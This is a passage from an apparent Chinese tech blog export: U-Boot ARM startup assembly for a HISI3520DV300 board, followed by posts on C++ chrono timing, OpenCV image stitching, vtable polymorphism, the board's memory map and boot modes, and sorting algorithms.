	ldr	r0, _bss_start		@ find start of bss segment
	ldr	r1, _bss_end		@ stop here
	mov	r2, #0x0		@ clear value
clbss_l:
	str	r2, [r0]		@ clear BSS location
	cmp	r0, r1			@ are we at the end yet
	add	r0, r0, #4		@ increment clear index pointer
	bne	clbss_l			@ keep clearing till at end

	ldr	pc, _start_armboot	@ jump to C code

_start_armboot: .word start_armboot

bug:

	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	b	.			&#x2F;* bug here *&#x2F;

&#x2F;*
 *************************************************************************
 *
 * Interrupt handling
 *
 *************************************************************************
 *&#x2F;
@
@ IRQ stack frame.
@
#define S_FRAME_SIZE	72

#define S_OLD_R0	68
#define S_PSR		64
#define S_PC		60
#define S_LR		56
#define S_SP		52

#define S_IP		48
#define S_FP		44
#define S_R10		40
#define S_R9		36
#define S_R8		32
#define S_R7		28
#define S_R6		24
#define S_R5		20
#define S_R4		16
#define S_R3		12
#define S_R2		8
#define S_R1		4
#define S_R0		0

#define MODE_SVC 0x13
#define I_BIT	 0x80

&#x2F;*
 * use bad_save_user_regs for abort&#x2F;prefetch&#x2F;undef&#x2F;swi ...
 * use irq_save_user_regs &#x2F; irq_restore_user_regs for IRQ&#x2F;FIQ handling
 *&#x2F;

	.macro	bad_save_user_regs
	sub	sp, sp, #S_FRAME_SIZE		@ carve out a frame on current
						@ user stack
	stmia	sp, &#123;r0 - r12&#125;			@ Save user registers (now in
						@ svc mode) r0-r12

	ldr	r2, _armboot_start
	sub	r2, r2, #(CONFIG_SYS_MALLOC_LEN)
	@ set base 2 words into abort
	sub	r2, r2, #(CONFIG_SYS_GBL_DATA_SIZE + 8)
						@ stack
	ldmia	r2, &#123;r2 - r3&#125;			@ get values for &quot;aborted&quot; pc
						@ and cpsr (into parm regs)
	add	r0, sp, #S_FRAME_SIZE		@ grab pointer to old stack

	add	r5, sp, #S_SP
	mov	r1, lr
	stmia	r5, &#123;r0 - r3&#125;			@ save sp_SVC, lr_SVC, pc, cpsr
	mov	r0, sp				@ save current stack into r0
						@ (param register)
	.endm

	.macro	irq_save_user_regs
	sub	sp, sp, #S_FRAME_SIZE
	stmia	sp, &#123;r0 - r12&#125;			@ Calling r0-r12
	add	r8, sp, #S_PC			@ !! R8 NEEDS to be saved !!
						@ a reserved stack spot would
						@ be good.
	stmdb	r8, &#123;sp, lr&#125;^			@ Calling SP, LR
	str	lr, [r8, #0]			@ Save calling PC
	mrs	r6, spsr
	str	r6, [r8, #4]			@ Save CPSR
	str	r0, [r8, #8]			@ Save OLD_R0
	mov	r0, sp
	.endm

	.macro	irq_restore_user_regs
	ldmia	sp, &#123;r0 - lr&#125;^			@ Calling r0 - lr
	mov	r0, r0
	ldr	lr, [sp, #S_PC]			@ Get PC
	add	sp, sp, #S_FRAME_SIZE
	subs	pc, lr, #4			@ return &amp; move spsr_svc into
						@ cpsr
	.endm

	.macro get_bad_stack
	ldr	r13, _armboot_start		@ setup our mode stack (enter
						@ in banked mode)
	@ move past malloc pool
	sub	r13, r13, #(CONFIG_SYS_MALLOC_LEN)
	@ move to reserved a couple
	sub	r13, r13, #(CONFIG_SYS_GBL_DATA_SIZE + 8)
						@ spots for abort stack

	str	lr, [r13]			@ save caller lr in position 0
						@ of saved stack
	mrs	lr, spsr			@ get the spsr
	str	lr, [r13, #4]			@ save spsr in position 1 of
						@ saved stack

	mov	r13, #MODE_SVC			@ prepare SVC-Mode
	@ msr	spsr_c, r13
	msr	spsr, r13			@ switch modes, make sure
						@ moves will execute
	mov	lr, pc				@ capture return pc
	movs	pc, lr				@ jump to next instruction &amp;
						@ switch modes.
	.endm

	.macro get_bad_stack_swi
	sub	r13, r13, #4			@ space on current stack for
						@ scratch reg.
	str	r0, [r13]			@ save R0‘s value.
	ldr	r0, _armboot_start		@ get data regions start
	@ move past malloc pool
	sub	r0, r0, #(CONFIG_SYS_MALLOC_LEN)
	@ move past gbl and a couple
	sub	r0, r0, #(CONFIG_SYS_GBL_DATA_SIZE + 8)
						@ spots for abort stack
	str	lr, [r0]			@ save caller lr in position 0
						@ of saved stack
	mrs	r0, spsr			@ get the spsr
	str	lr, [r0, #4]			@ save spsr in position 1 of
						@ saved stack
	ldr	r0, [r13]			@ restore r0
	add	r13, r13, #4			@ pop stack entry
	.endm

	.macro get_irq_stack			@ setup IRQ stack
	ldr	sp, IRQ_STACK_START
	.endm

	.macro get_fiq_stack			@ setup FIQ stack
	ldr	sp, FIQ_STACK_START
	.endm

&#x2F;*
 * exception handlers
 *&#x2F;
	.align	5
undefined_instruction:
	get_bad_stack
	bad_save_user_regs
	bl	do_undefined_instruction

	.align	5
software_interrupt:
	get_bad_stack_swi
	bad_save_user_regs
	bl	do_software_interrupt

	.align	5
prefetch_abort:
	get_bad_stack
	bad_save_user_regs
	bl	do_prefetch_abort

	.align	5
data_abort:
	get_bad_stack
	bad_save_user_regs
	bl	do_data_abort

	.align	5
not_used:
	get_bad_stack
	bad_save_user_regs
	bl	do_not_used

#ifdef CONFIG_USE_IRQ

	.align	5
irq:
	get_irq_stack
	irq_save_user_regs
	bl	do_irq
	irq_restore_user_regs

	.align	5
fiq:
	get_fiq_stack
	&#x2F;* someone ought to write a more effective fiq_save_user_regs *&#x2F;
	irq_save_user_regs
	bl	do_fiq
	irq_restore_user_regs

#else

	.align	5
irq:
	get_bad_stack
	bad_save_user_regs
	bl	do_irq

	.align	5
fiq:
	get_bad_stack
	bad_save_user_regs
	bl	do_fiq

#endif

&#x2F;*
 *	v7_flush_dcache_all()
 *
 *	Flush the whole D-cache.
 *
 *	Corrupted registers: r0-r5, r7, r9-r11
 *
 *	- mm	- mm_struct describing address space
 *&#x2F;
	.align 5
.global v7_flush_dcache_all
v7_flush_dcache_all:
	stmfd	r13!, &#123;r0 - r5, r7, r9 - r12, r14&#125;

	mov	r7, r0				@ take a backup of device type
	cmp	r0, #0x3			@ check if the device type is
						@ GP
	moveq r12, #0x1				@ set up to invalide L2
smi:	.word 0x01600070			@ Call SMI monitor (smieq)
	cmp	r7, #0x3			@ compare again in case its
						@ lost
	beq	finished_inval			@ if GP device, inval done
						@ above

	mrc	p15, 1, r0, c0, c0, 1		@ read clidr
	ands	r3, r0, #0x7000000		@ extract loc from clidr
	mov	r3, r3, lsr #23			@ left align loc bit field
	beq	finished_inval			@ if loc is 0, then no need to
						@ clean
	mov	r10, #0				@ start clean at cache level 0
inval_loop1:
	add	r2, r10, r10, lsr #1		@ work out 3x current cache
						@ level
	mov	r1, r0, lsr r2			@ extract cache type bits from
						@ clidr
	and	r1, r1, #7			@ mask of the bits for current
						@ cache only
	cmp	r1, #2				@ see what cache we have at
						@ this level
	blt	skip_inval			@ skip if no cache, or just
						@ i-cache
	mcr	p15, 2, r10, c0, c0, 0		@ select current cache level
						@ in cssr
	mov	r2, #0				@ operand for mcr SBZ
	mcr	p15, 0, r2, c7, c5, 4		@ flush prefetch buffer to
						@ sych the new cssr&amp;csidr,
						@ with armv7 this is &#39;isb&#39;,
						@ but we compile with armv5
	mrc	p15, 1, r1, c0, c0, 0		@ read the new csidr
	and	r2, r1, #7			@ extract the length of the
						@ cache lines
	add	r2, r2, #4			@ add 4 (line length offset)
	ldr	r4, &#x3D;0x3ff
	ands	r4, r4, r1, lsr #3		@ find maximum number on the
						@ way size
	clz	r5, r4				@ find bit position of way
						@ size increment
	ldr	r7, &#x3D;0x7fff
	ands	r7, r7, r1, lsr #13		@ extract max number of the
						@ index size
inval_loop2:
	mov	r9, r4				@ create working copy of max
						@ way size
inval_loop3:
	orr	r11, r10, r9, lsl r5		@ factor way and cache number
						@ into r11
	orr	r11, r11, r7, lsl r2		@ factor index number into r11
	mcr	p15, 0, r11, c7, c6, 2		@ invalidate by set&#x2F;way
	subs	r9, r9, #1			@ decrement the way
	bge	inval_loop3
	subs	r7, r7, #1			@ decrement the index
	bge	inval_loop2
skip_inval:
	add	r10, r10, #2			@ increment cache number
	cmp	r3, r10
	bgt	inval_loop1
finished_inval:
	mov	r10, #0				@ swith back to cache level 0
	mcr	p15, 2, r10, c0, c0, 0		@ select current cache level
						@ in cssr
	mcr	p15, 0, r10, c7, c5, 4		@ flush prefetch buffer,
						@ with armv7 this is &#39;isb&#39;,
						@ but we compile with armv5

	ldmfd	r13!, &#123;r0 - r5, r7, r9 - r12, pc&#125;

#include &quot;lowlevel_init.S&quot;


  注意：关于Start.S我说明可能有错的地方，check_boot_type:标号附近，关于这里的详细说明，参考后续文章的内存映射部分。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>uboot</tag>
        <tag>Start.S</tag>
        <tag>HISI3520DV300</tag>
      </tags>
  </entry>
  <entry>
    <title>C++11 中运行代码块耗时的方法以及坑（chrono 方法）</title>
    <url>/2018/03/19/blog_idx_057/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




chrono



chrono 简介：
  来源：http://www.cplusplus.com/reference/chrono/?kw=chrono
The elements in this header deal with time. This is done mainly by means of three concepts:
Durations
They measure time spans, like: one minute, two hours, or ten milliseconds.
In this library, they are represented with objects of the duration class template, that couples a count representation and a period precision (e.g., ten milliseconds has ten as count representation and milliseconds as period precision).
Time points
A reference to a specific point in time, like one's birthday, today's dawn, or when the next train passes.
In this library, objects of the time_point class template express this by using a duration relative to an epoch (which is a fixed point in time common to all time_point objects using the same clock).
Clocks
A framework that relates a time point to real physical time.
The library provides at least three clocks that provide means to express the current time as a time_point: system_clock, steady_clock and high_resolution_clock.


对我来看：
  3种计时方式以及一个时间转换方式就ok，分别对应：
计时方式：
std::chrono::high_resolution_clock //high_resolution_clock is the clock with the shortest tick period. It may be a synonym for system_clock or steady_clock.
std::chrono::system_clock //Specifically, system_clock is a system-wide realtime clock.
std::chrono::steady_clock //steady_clock is specifically designed to calculate time intervals.
时间转换方式：
std::chrono::duration_cast
/*
Converts the value of dtn into some other duration type, taking into account differences in their periods.

The function does not use implicit conversions. Instead, all count values are internally converted into the widest representation (the common_type for the internal count types) and then casted to the destination type, all conversions being done explicitly with static_cast.
*/
chrono 大法中的坑（不同的时钟计时存在ms及us及ns级别的差别）
//windows下，std::chrono::system_clock 可能计时不准确，注意这里是“”“”可能“”“”
//windows下，high_resolution_clock 时间计时最精确，如果需要最高精确度，请使用此时钟
//总结：
//1 如果是秒级时间评估，std::chrono::system_clock 无所谓，如果是ms、us、ns级的时间评估(这里我做算法评估)，那么std::chrono::system_clock可能会出现较大的问题，这时候可用high_resolution_clock来解决此问题。
//2 如果计时应用在了多个线程，你需要把所有线程的计时加起来，才是你的真正耗时
//同时我猜测，出现此问题的原因就是不同时钟类型用的时间片(就是对应不同类型的一个时钟周期)是不一样的。当然，有一些cpu相关知识的朋友应该知道，最准确的计时是：时间片=cpu时钟周期（这是不合理的，理解到一部分就行了）


chrono 计时方法
//代码点一
std::chrono::time_point&lt;std::chrono::high_resolution_clock> p0 = std::chrono::high_resolution_clock::now();
// ....... 若干代码
//代码点二
std::chrono::time_point&lt;std::chrono::high_resolution_clock> p1 = std::chrono::high_resolution_clock::now();

//计算及打印耗时，用法不太标准,文中的1000 是换算到毫秒的意思
cout &lt;&lt; "stitch high_resolution_clock time:" &lt;&lt; (float)std::chrono::duration_cast&lt;std::chrono::microseconds>(p1 - p0).count() / 1000 &lt;&lt; "ms" &lt;&lt; endl;




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>chrono</tag>
        <tag>c++11</tag>
      </tags>
  </entry>
  <entry>
    <title>关于全景（360）图片拼接的方法（Opencv3.0 Stitcher）</title>
    <url>/2018/03/19/blog_idx_058/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




Opencv Stitcher

  最近有个项目就是要采集海康摄像头（可转动的摄像头）的数据做全景图片拼接，然后送到算法模块去检测人脸数目。
  这里使用的是opencv 3.0+ 的Stitcher 类。
   std::vector&lt;cv::Mat> vecSrc;//t1.jpg,t2.jpg,t3.jpg
   cv::Mat Dst;
Stitcher stitcher = Stitcher::createDefault(false); 
Stitcher::Status status = stitcher.stitch(vecSrc, Dst); 
if (status != Stitcher::OK)&#123;  
	cout &lt;&lt; "图像相似度太差，拼接失败！ "  &lt;&lt; endl;  

&#125;  
else &#123;
	imshow("out", Dst);//out.jpg

&#125;
  下面是原始图片和拼接后的图片：
t1

    
        
    
    
t2

    
        
    
    
t3

    
        
    
    
t4

    
        
    
    
  注意：这里的out图片可以看到边缘丢失了一部分，如果图片源大小不一致或者重叠部分不明显，则可能丢失更多。此外：图片需要相当一部分的重叠才能拼接，否则拼接失败。
  问题：合成后的图片拼接部分可能扭曲




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>计算机视觉</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>opencv</tag>
        <tag>全景</tag>
      </tags>
  </entry>
  <entry>
    <title>关于C++ 多态实现技术的深度解析（vfptr,vftable）</title>
    <url>/2018/04/04/blog_idx_059/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  关于C的多态，我就不多说了，我理解的一句话就是：一个接口，多种实现（简称：一对多）。在C里面，多态的最重要的实现方法为继承，简单来说：就是基类提供接口，子类可以实现基类的接口，不同的子类就构成了基类接口的不同的实现。以上就是C课本上或者C原理上的常见的知识。
  而今天这里所说明的是多态是怎么实现的，以及实现的详细方法。我个人认为：只有了解了这些东西后，我们才不会在多态中迷失自己的方向，导致代码稀烂。




c++ 多态



多态的实现
  多态的实现是通过一个指针数组实现的。此指针数组的一般声明如下：
//虚函数表
void ** vfptr;//此ptr指向一个void * 的数组
  说明: vfptr 变量的声明是C++编译器根据：当一个带有虚函数的类定义了一个实例时，编译器会自动在此类的前4bytes（32bit 系统）添加vfptr变量来实现多态。同时编译器会生成一个void *数组来存放实际接口方法地址（其实这里就已经实现了多态，也就是说：这里就已经定义好了这个实例可以调用哪些实际接口方法，例如是来至于基类还是子类等等），也就是虚函数表（vftable），此表是放在生成的可执行文件的数据段。
  总结：这里有一些基本的习惯。


vfptr放在一个类的起始相关地址。


vftable中的方法按照继承顺序、接口声明顺序赋值。


  以上都是自己瞎扯的原理，看不懂也没有啥问题，毕竟我的语文水平不高，语言组织能力不行，直接跳过查看下面的实例分析。


多态的实现原理解析实例
class Base
&#123;
public:
	Base() &#123;&#125;
	~Base() &#123;&#125;
	virtual void base1(void) &#x3D; 0;
	virtual void base2(void) &#123;&#125;;
	virtual void base3(void) &#123;&#125;;
	int base_a &#x3D; 0;
private:

&#125;;
class Base1
&#123;
public:
	Base1() &#123;&#125;
	~Base1() &#123;&#125;
	virtual void base2(void) &#123;&#125;;
	virtual void base3(void) &#123;&#125;;
	int base_a &#x3D; 0;
private:

&#125;;

class Derive:public Base
&#123;
public:
	Derive() &#123;&#125;
	~Derive() &#123;&#125;
	virtual void base1(void) &#123;&#125;
	virtual void base2(void) &#123;&#125;
	int derive_a &#x3D; 1;
private:

&#125;;
class Derive1 :public Base
&#123;
public:
	Derive1() &#123;&#125;
	~Derive1() &#123;&#125;
	virtual void base1(void) &#123;&#125;
	virtual void base2(void) &#123;&#125;
	virtual void derive1(void) &#123;&#125;
	virtual void derive2(void) &#123;&#125;
	int derive_a &#x3D; 2;
private:

&#125;;

class Derive2:public Derive1
&#123;
public:
	Derive2() &#123;&#125;
	~Derive2() &#123;&#125;
	virtual void derive1(void) &#123;&#125;

private:

&#125;;

int main()
&#123;
	Base1 b1;
	Derive d1;
	Derive1 dd1;
	Derive2 ddd1;
    return 0;
&#125;




20200306 动态绑定的补充
 关于派生对象地址赋值给基类指针 并使用基类指针调用派生类函数。源码如下：

    
        
    
    
(20200326补充END)
  以下是vs2015的调试分析截图：（若只想了解一下vfptr和vftable是个什么样子，只看此图并结合代码分析足以）

    
        
    
    
友情提示：此图中关于ddd1的vfptr和我们想要的结果是不同的，原因和调试器相关，具体关于ddd1哪里有问题，若有需求，请看以下分析。


多态的实现原理解析实例（进阶版）
  同上一份代码，我们深入到汇编里面，就可以发现一些我们不知道的细节，关于这些汇编中的其他内容部分，若想了解，参考此文章：https://blog.csdn.net/u011728480/article/details/79092194。
  这里我们只分析变量ddd1的生成过程。
  用ida载入我们生成的exe文件。找到main函数中ddd1初始化入口如下：

    
        
    
   


20200306 动态绑定的补充
关于派生对象地址赋值给基类指针 并使用基类指针调用派生类函数。反汇编如下：

    
        
    
  
ddd1对象的vfptr如下：

    
        
    
 
可以发现动态绑定的时候，基类指针的vfptr已经指向了ddd1对象的vfptr。
(20200326补充END)
  这里我们跳转到call后面的地址查看Derive2的构造函数，先调用Derive1的构造函数，再给vfptr赋值。下图是构造函数汇编

    
        
    
 
  下图是vfptr的赋值内容，也就是vftable是什么样子的

    
        
    
 
  这里可以看到，其实此实例调用的是哪些方法（也就实现了多态），早已经在编译时就确定了，只是这里才赋值而已，所以可以说是动态绑定或者静态绑定。
  下图为Derive1构造函数以及vftable值：

    
        
    
 

    
        
    
 
  下图为Base构造函数以及vftable的值：

    
        
    
 

    
        
    
 
  以上总结：我们可以发现vfptr经过了多次赋值的，不同的时间段，vfptr值不一样，所以在构造实例的时候，不同时段调用同一个接口，会有不同的方法。
同时也可以得出一个结论，每个接口的实现类都有一个虚函数表，包括接口类本身，这些虚函数表在编译时就确定了，只是vfptr赋值的时候，是在程序运行时确定的。
  根据以上的分析，可以解决许多我们关于多态的疑问。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>虚函数表</tag>
        <tag>多态</tag>
        <tag>继承</tag>
      </tags>
  </entry>
  <entry>
    <title>HISI3520DV300 折腾记录(二)之《内存映射、存储(DDRC,FMC)、启动模式分析》</title>
    <url>/2018/03/10/blog_idx_056/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  此文分析基于某HISI3520DV300单板以及所带的datasheet




启动分析

  关于其启动方式有如图说明：

    
        
    
    
  解释：支持bootrom和SPI Flash两种启动方式，由BOOTROM_SEL引脚决定。bootrom是海思已经写好的程序烧写在里面，支持和其自身所写的PC软件进行串口通信。




存储模块（DDRC,FMC）



DDRC（hisi3520dv300 支持16bit数据读写）
  SDRAM信息：


此板子的SDRAM型号为：k4b2g1646q-bck0


此SDRAM相关信息如图：



    
        
    
   


容量：2Gbit (就是256MByte)


数据宽度：16bit


banks:8


每bank大小：128MBbit


  DDRC信息：
连线：

    
        
    
   
  地址线分配：

    
        
    
   


DDR_BA：3bit


DDR_R:14bit


DDR_C:10


  并且只支持RBC地址映射模式(行地址+bank+列地址+数据宽度)
  于是此板子SDRAM：2^(14+3+10+1)=256MB


FMC
  NAND信息：


此板子NAND型号为：mx25l256fz2


此型号相关信息为：



    
        
    

  FMC信息：

    
        
    

  于是此板子NAND大小为256MBits




内存映射（最重要，所有的一切都基于此）

  地址映射图：

    
        
    


    
        
    


    
        
    


    
        
    


    
        
    


    
        
    

  关于0x8000 0000—0xFFFF FFFF此地址空间是分配给SDRAM用的（也就是我们说的内存）
  关于0x0000 0000—0x03FF FFFF：


在地址映射时：这64MB指向启动地址空间。


在地址映射取消时：指向片内的16KB 空间。


下文纯属我的“猜测”，因为其提供的文档说明极不详细：首先关于其Start.S的某段：
normal_start_flow:

       	@if running not boot from  spi&#x2F;nand&#x2F;ddr ram,
		@we skipping boot_type checking.
		&#x2F;*
		0x1400_0000:SFC NAND&#x2F;NOR MEMORY
地址空间
		*&#x2F;
    	mov    r0, pc, lsr#24
    	cmp    r0, #0x0
    	bne    do_clr_remap

check_boot_type:
        ldr     r0, &#x3D;SYS_CTRL_REG_BASE
        ldr     r0, [r0, #REG_SYSSTAT]
        mov     r6, r0, lsr#4
	and     r6, #0x1
	&#x2F;*
		此处可能有个错误，按照datasheet应该右移31bit才行
	*&#x2F;
        cmp     r6, #0			@ [4] &#x3D; 0 FMC &#x2F;* spi nor | spi nand *&#x2F;
        ldreq   pc, _clr_remap_fmc_entry
     &#x2F;*
	这里应该永久跳转才对，不然就卡死了。结合下文内容，感觉应该右移31位才对。
*&#x2F;

	@otherwise, [31]&#x3D;1 means boot from bootrom, err
	beq	bug
文中的REG_SYSSTAT寄存器在datasheet中的说明如下：

    
        
    


    
        
    

关于“”启动地址空间“这个词语，我猜测是来至于：0x1400 0000—0x14FF FFFF
关于其FMC还有一句话：

    
        
    

这部分说：CPU可以直接读取的最大1MB的数据。
所以对于NAND，直接上电时，NAND器件中的16MB被硬件默认映射到0x1400 0000—0x14FF FFFF这个地址（或者换句话说：0x1400 0000—0x14FF FFFF就是NAND器件中起始16MB这时候的地址），且当cpu上电时，根据内存映射寄存器的值，确定默认是开启内存映射的，于是，0x1400 0000—0x14FF FFFF被映射到了0x0000 0000 0x00FF FFFF中，这个时候PC指向0x0000 0000 开始执行指令。也就是前文所说的：b reset
注意：以上关于NAND启动原理，纯属我的猜测，因为它的datasheet文档确实感觉不够详细。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>DDRC</tag>
        <tag>FMC</tag>
        <tag>内存映射</tag>
      </tags>
  </entry>
  <entry>
    <title>《基础数据结构-排序》之交换排序</title>
    <url>/2018/05/10/blog_idx_060/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  MEM:2GB
  CPU:Intel® Core™ i5-7400 CPU @ 3.00GHz × 4
  SYSTEM:Linux 4.13.0-38-generic #43~16.04.1-Ubuntu SMP Wed Mar 14 17:48:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux（虚拟机）
  测试数据（100000条数据，数据范围1-100000）下载链接：https://download.csdn.net/download/u011728480/10399194
前言

  此系列大概会有三类文章，包括我在学校不太掌握的三种类型的相关算法，分别为排序、树、图中的基础算法。这里主要对这些算法进行一个巩固，期望使自己的相关技术有一定的提高。
  排序算法要解决的问题是：把一系列已存在的数据（乱序），按照一定规律（有序）进行存放。我们常见的就是数字的按照其大小进行排序。排序按照其实现的核心原理分为约4中类型：交换排序、插入排序、选择排序和归并排序。下面依次对这些排序进行说明和总结。
  ps：上面内容都是扯淡，大佬直接忽略。




交换排序

  交换排序有两种常见算法：冒泡排序和快速排序


冒泡排序
  就是遍历，交换。把符合某规律的数据元素交换到数据顶端（有条件的末端），重复此过程，直到数据序列有序为止。
  使用上文数据进行排序，结果如图：

    
        
    
    
  平均时间复杂度：O(n ^ 2)
  空间复杂度：O(1)
  实现代码（下面算法是未做任何优化的，一种优化方法为：如果为发生数据交换，则数据有序且退出整个循环）：
/*

worst time:
surrounding loop=n-1
compare=n(n-1)/2  (等差数列求和，1,2....n-1)
exchange=3n(n-1)/2 (等差数列求和，1,2....n-1,每次交换3次)

best time:(针对此代码，未优化)
surrounding loop=n-1
compare=n(n-1)/2
exchange=0


average-time:O(n ^ 2)
space:O(1)

*/


#include &lt;iostream>
#include &lt;fstream>
#include &lt;chrono>
#include &lt;string>
#include &lt;assert.h>
#include &lt;functional>


template &lt;typename T, typename T1>
int bubble_sort(T * const head, const T1 &amp;len, std::function&lt;void(T&amp;, T&amp;)> swap_func = nullptr)&#123;
//int bubble_sort(T * const head, const T1 &amp;len, void (*swap_func)(T&amp;,T&amp;) = nullptr)&#123;

	//data_len data_tmp must init for type deduction
	auto data_len = len;//
	auto data_tmp = *head;//
	auto i = len,j = len;
	//len-1 traverse
	for (j = 1; j &lt; data_len; j ++)&#123;//n-1
		
		for (i = 0; i &lt; data_len -j; i ++)&#123;

			if ( nullptr != swap_func )
				swap_func(*(head+i), *(head+i+1));
			else&#123;
		
				if ( *(head+i) > *(head+i+1) )&#123;
			
					data_tmp = *(head+i);
					*(head+i) = *(head+i+1);
					*(head+i+1) = data_tmp;
				&#125;
			&#125;
		&#125;
	&#125; 
	return 0;
&#125;

#define DATA_LEN 100000

int main(int argv, char * argc[])&#123;
	
	long * buffer;
	std::filebuf *pbuf;  
	std::ifstream in;
	std::ofstream out;
	in.open("data.txt");
	assert(in.is_open());
	long idx = 0;
	
	buffer = new long[DATA_LEN];

	std::string data;
	for ( ; idx &lt; DATA_LEN; idx++ )&#123;
			
		getline(in, data);	
		*(buffer+idx) = atol(data.c_str());
	&#125;
	in.close();

	std::chrono::time_point&lt;std::chrono::high_resolution_clock> p0 = std::chrono::high_resolution_clock::now();
	bubble_sort(buffer, DATA_LEN);
 	std::chrono::time_point&lt;std::chrono::high_resolution_clock> p1 = std::chrono::high_resolution_clock::now();
	std::cout &lt;&lt; "stitch high_resolution_clock time:" &lt;&lt; (float)std::chrono::duration_cast&lt;std::chrono::microseconds>(p1 - p0).count() / 1000 &lt;&lt; "ms" &lt;&lt; std::endl;
    	
	out.open("bubble_sort.txt");
	assert(out.is_open());
	
	for (idx = 0 ; idx &lt; DATA_LEN; idx++ )&#123;
			
		out&lt;&lt;*(buffer+idx);
		out&lt;&lt;"\n";
	&#125;
	out.close();
	
  	delete []buffer;  
	return 0;
&#125;



快速排序
  选定一个基准数（一般为第一个数），然后把小于此数的数放到其左边，大于此数放到右边，这时，此数组被分为了两组。然后分别对这两组数进行同样的操作，直到数无法继续分组为止。
  使用上文数据进行排序，结果如图：

    
        
    
   
  平均时间复杂度：O(nlog(n))
  空间复杂度：O(log(n)~n)
  实现代码：
/*
worst time:O(n^2)
(每次我们指定的分割数是数列里面最大，或者最小，这样导致只会把一个数放到了正确的位置，类似选择排序或者冒泡排序，由于是递归调用，可参考二叉树结构分析)

（此时二叉树结构为最不平衡的二叉树，退化为一条线）
compare=n(n-1)/2(第一次比较n-1,第二次比较n-2  ...   1)
exchange=n(n-1)/2

best time: nlog(n) (注意，取的是数量级)
(参考平衡二叉树)
tree-deepth=log(n)
compare=(n/2)(1-(0.5^n))/(1-0.5) (等比数列求和,n/2 , n/4, ... n/2^n)
exchange=0


average-time:O(nlog(n)) (这里要用什么来证明一下，我搞不清楚原理了)
space:O(log(n)~n)(最坏时间为n(递归深度n)，最优时间为log(n)(递归深度log(n)))

*/


#include &lt;iostream>
#include &lt;fstream>
#include &lt;chrono>
#include &lt;string>
#include &lt;assert.h>
#include &lt;functional>


template &lt;typename T, typename T1>
int quick_sort(T * const head, T1 low, T1 high, std::function&lt;T1(T * const, T1 , T1 )> split_func)&#123;
//int bubble_sort(T * const head, const T1 &amp;len, void (*swap_func)(T&amp;,T&amp;) = nullptr)&#123;

	//split must init for type deduction
	auto split = low;
	if (low &lt; high)&#123;
		
		split =  split_func(head, low, high);//split into two arrary and get split val 
		quick_sort(head, low, split-1, split_func);//deal &lt; split 
		quick_sort(head, split+1, high, split_func);//deal > split 
		
	&#125;
		
	
	return 0;
&#125;


long int split_func_imp(long int * const head, long int low, long int high)&#123;
	
	auto split_val = head[low];
	for (; low &lt; high ;)&#123;
		
		for ( ; low &lt; high &amp;&amp; head[high] &lt;= split_val ; )
			high--;
		head[low] = head[high];
		
		for ( ; low &lt; high &amp;&amp; head[low] >= split_val ; )
			low++;
		head[high] = head[low];
	&#125;
	head[low] = split_val;
	return low;
&#125;


#define DATA_LEN 100000

int main(int argv, char * argc[])&#123;
	
	long * buffer;
	std::filebuf *pbuf;  
	std::ifstream in;
	std::ofstream out;
	in.open("data.txt");
	assert(in.is_open());
	long idx = 0;
	
	buffer = new long[DATA_LEN];

	std::string data;
	for ( ; idx &lt; DATA_LEN; idx++ )&#123;
			
		getline(in, data);	
		*(buffer+idx) = atol(data.c_str());
	&#125;
	in.close();
	long low = 0;
	long high = DATA_LEN;
	std::function&lt;long int (long int * const, long int , long int )> func = split_func_imp;
	std::chrono::time_point&lt;std::chrono::high_resolution_clock> p0 = std::chrono::high_resolution_clock::now();
	quick_sort(buffer, low, high, func);
 	std::chrono::time_point&lt;std::chrono::high_resolution_clock> p1 = std::chrono::high_resolution_clock::now();
	std::cout &lt;&lt; "stitch high_resolution_clock time:" &lt;&lt; (float)std::chrono::duration_cast&lt;std::chrono::microseconds>(p1 - p0).count() / 1000 &lt;&lt; "ms" &lt;&lt; std::endl;
    	
